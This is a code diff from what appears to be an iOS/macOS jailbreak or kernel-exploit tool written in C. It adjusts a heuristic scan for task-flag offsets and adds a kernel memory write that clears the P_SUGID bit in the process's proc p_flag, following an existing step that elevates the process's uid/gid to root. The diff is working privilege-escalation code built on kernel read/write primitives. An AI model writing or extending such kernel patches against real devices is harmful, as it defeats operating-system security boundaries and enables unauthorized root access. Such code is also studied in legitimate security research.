@@ -25,6 +25,7 @@
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 
 #define P_DISABLE_ASLR 0x00001000
+#define P_SUGID        0x00000100
 
 uint32_t PROC_PID_OFFSET;                           // p_pid
 static const uint32_t PROC_NAME_OFFSET = 0x56c;     // p_comm
@@ -421,7 +422,7 @@ static uint32_t find_task_flags_offset(uint64_t task, uint32_t *taskCsflagsOffOu
         }
     }
 
-    for (uint32_t off = 0x100; off < 0x700; off += 4) {
+    for (uint32_t off = 0x100; off < 0x500; off += 4) {
         uint32_t flags = ds_kread32(task + off);
         uint32_t taskFlags = ds_kread32(task + off + 4);
 
@@ -446,16 +447,6 @@ static uint32_t find_task_flags_offset(uint64_t task, uint32_t *taskCsflagsOffOu
             }
             return off;
         }
-    }
-
-    for (uint32_t off = 0x100; off < 0x700; off += 4) {
-        uint32_t csOff = off + 4;
-        if (!is_plausible_task_pair(off, csOff)) continue;
-        persist_task_pair(off, csOff);
-        if (taskCsflagsOffOut) {
-            *taskCsflagsOffOut = csOff;
-        }
-        return off;
     }
 
     return 0;
@@ -584,6 +575,16 @@ static int prepareIOKitAccess(void) {
                 oldUid, newUid, oldGid, newGid);
     if (!uidPatched || !gidPatched || newUid != 0 || newGid != 0) {
         kernel_logf("prepareIOKitAccess: proc uid/gid elevation verify failed (non-critical)");
+        hadNonCriticalFailures = true;
+    }
+
+    uint32_t oldPflag = ds_kread32(self + PROC_PFLAG_OFFSET);
+    uint32_t desiredPflag = oldPflag & ~P_SUGID;
+    bool pflagPatched = kwrite32_retry(self + PROC_PFLAG_OFFSET, desiredPflag, 3);
+    uint32_t newPflag = ds_kread32(self + PROC_PFLAG_OFFSET);
+    kernel_logf("prepareIOKitAccess: proc p_flag before=0x%x after=0x%x", oldPflag, newPflag);
+    if (!pflagPatched || newPflag != desiredPflag) {
+        kernel_logf("prepareIOKitAccess: proc p_flag patch verify failed (non-critical)");
         hadNonCriticalFailures = true;
     }
 
